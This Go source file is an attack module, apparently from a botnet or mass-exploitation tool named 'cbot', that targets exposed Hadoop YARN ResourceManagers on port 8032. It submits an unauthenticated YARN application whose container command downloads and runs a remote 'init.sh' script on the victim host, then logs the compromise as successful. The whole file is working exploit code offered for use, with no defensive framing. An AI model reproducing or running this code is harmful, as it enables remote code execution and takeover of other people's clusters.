package hadoop

import (
	"fmt"
	"github.com/cbot/attack"
	"github.com/cbot/proto/hadoop/hadoop_yarn"
	yarn_conf "github.com/cbot/proto/hadoop/hadoop_yarn/conf"
	"github.com/cbot/proto/hadoop/hadoop_yarn/yarn_client"
	"github.com/cbot/targets/source"
	"log"
	"strings"
)

const (
	HadoopIPCAttackName = "HadoopIPCAttack"
	HadoopIPCAttackType = "HadoopIPCAttack"
	HadoopIPCAttackDefaultPort = 8032
	HadoopIPCAttackDefaultProto = "hrpc"
)

type HadoopIPCAttack struct {

	attackTasks *attack.AttackTasks
}

func NewHadoopIPCAttack(attackTasks *attack.AttackTasks) *HadoopIPCAttack {

	return &HadoopIPCAttack {
		attackTasks: attackTasks,
	}
}

func (ha *HadoopIPCAttack) Name() string {

	return HadoopIPCAttackName
}

func (ha *HadoopIPCAttack) DefaultPort() int {

	return HadoopIPCAttackDefaultPort
}

func (ha *HadoopIPCAttack) DefaultProto() string {

	return HadoopIPCAttackDefaultProto
}

func (ha *HadoopIPCAttack) Accept(target source.Target) bool {

	types := target.Source().GetTypes()

	for _, t := range types {

		if strings.EqualFold(t, HadoopIPCAttackType) {

			return true
		}
	}

	return false
}

func (ha *HadoopIPCAttack) doAttack(ip string ,port int) error {

	var AppName string = "cbot_hadoop_ipc_attack"
	var AppType string = "cbot_hadoop_ipc_attack"
	var AppQueue string = "default"
	var memory int32 = 1024

	addr := fmt.Sprintf("%s:%d",ip,port)

	// Create YarnConfiguration
	conf, err := yarn_conf.NewYarnConfiguration()
	if err!=nil {

		return fmt.Errorf("Create hadoop yarn configuration failed:%v",err)
	}

	conf.SetRMAddress(addr)

	// Create YarnClient
	yarnClient, err := yarn_client.CreateYarnClient(conf)
	if err!=nil {
		return fmt.Errorf("Create hadoop yarn client failed:%v",err)
	}

	// Create new application to get ApplicationSubmissionContext
	_, asc, err := yarnClient.CreateNewApplication()

	if err!=nil {

		return fmt.Errorf("create a new hadoop yarn application failed:%v",err)
	}

	initUrl := ha.attackTasks.DownloadInitUrl(ip, port,HadoopIPCAttackType, "init.sh")
	cmd := ha.attackTasks.InitCmdForLinux(initUrl)

	// Setup ContainerLaunchContext for the application
	clc := hadoop_yarn.ContainerLaunchContextProto{}
	clc.Command = []string{cmd}

	// Resource for ApplicationMaster

	resource := hadoop_yarn.ResourceProto{Memory: &memory}

	// Setup ApplicationSubmissionContext for the application
	asc.AmContainerSpec = &clc
	asc.Resource = &resource
	asc.ApplicationName = &AppName
	asc.Queue = &AppQueue
	asc.ApplicationType = &AppType

	// Submit!
	err = yarnClient.SubmitApplication(asc)
	if err != nil {
		return fmt.Errorf("submit hadoop yarn application failed:%v",err)
	}

	//submit ok,so attack is ok
	ap := &attack.AttackProcess{
		TengoObj: attack.TengoObj{},
		IP:       ip,
		Host:     ip,
		Port:     port,
		Proto:    HadoopIPCAttackDefaultProto,
		App:      "hadoop_yarn",
		OS:       "unknown",
		Name:     HadoopIPCAttackName,
		Type:     HadoopIPCAttackType,
		Status:   0,
		Payload:  cmd,
		Result:   "",
		Details:  asc.ApplicationId.String(),
	}

	ha.PubProcess(ap)

	log.Printf("Attack Hadoop Yarn by IPC is successfull,target:%s",addr)

	return nil
}


func (ha *HadoopIPCAttack) Run(target source.Target) error {

	defer ha.attackTasks.PubUnSyn()

	ip := target.IP()
	port := target.Port()

	if port <= 0 {

		port = ha.DefaultPort()
	}

	if ip == "" || port <= 0 {
		return fmt.Errorf("Invalid ip:%s and port:%d", ip, port)
	}

	if err := ha.doAttack(ip,port);err!=nil {

		log.Println(err)
		return err
	}

	return nil
}

func (ha *HadoopIPCAttack) PubProcess(process *attack.AttackProcess) {

	ha.attackTasks.PubAttackProcess(process)

}

